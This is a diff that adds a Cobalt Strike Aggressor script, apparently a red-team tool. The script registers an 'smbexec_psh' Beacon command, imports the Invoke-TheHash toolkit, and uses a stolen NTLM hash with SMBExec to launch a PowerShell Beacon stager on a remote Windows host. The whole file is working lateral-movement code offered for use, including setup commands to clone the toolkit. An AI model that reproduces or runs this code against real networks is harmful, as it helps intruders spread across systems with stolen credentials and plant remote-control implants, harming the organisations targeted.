@@ -1,0 +1,54 @@
+# Lateral Movement using Invoke-TheHash toolkit
+# Written by Mumbai
+# git clone https://github.com/Kevin-Robertson/Invoke-TheHash
+# mv Invoke-TheHash/Invoke-TheHash.ps1 Invoke-TheHash.ps1
+# cat Invoke-TheHash/Invoke-*.ps1 >> Invoke-TheHash.ps1
+
+
+beacon_command_register("smbexec_psh", "Lateral movement using Invoke-TheHash toolkit",
+				       "Synopsis: smbexec_psh [x86/x64] [target] [listener] [username] [domain] [ntlm]\n\n",
+				       "Run a payload on a target via Invoke-TheHash SMBExec");
+
+alias smbexec_psh {
+	if (listener_info($4) is $null) {
+		openPayloadHelper({
+			smbexec_psh_go($bid, $arch, $target, $1, $username, $domain, $ntlm);
+		}, $bid => $1, $arch=> $2, $target => $3, $username => $5, $domain => $6, $ntlm => $7);
+	}
+	else {
+		smbexec_psh_go($1, $2, $3, $4, $5, $6, $7);
+	}
+}
+
+sub smbexec_psh_go {
+	local('$command $beaconstage $stagearch');
+
+	btask($1, "Tasked Beacon to jump to $3 (" . listener_describe($4, $3) . ") via SMB Exec");
+	
+	if ("x86" eq $2) {
+		$stagearch = "x86"
+	} else {
+		$stagearch = "x64"
+	}
+	
+	$beaconstage = powershell($4, true, $stagearch);
+	
+	
+	bpowershell_import!($1, script_resource("Invoke-TheHash.ps1"));
+
+	$command  = 'Invoke-SmbExec -Target ';
+	$command .= $3;
+	$command .= ' -Command "';
+	$command .= $beaconstage;
+	$command .= '" -Username ';
+	$command .= $5;
+	$command .= ' -Domain ';
+	$command .= $6;
+	$command .= ' -Hash ';
+	$command .= $7;
+
+	bpowerpick!($1, $command);
+
+	bstage($1, $3, $4, $stagearch);
+
+}
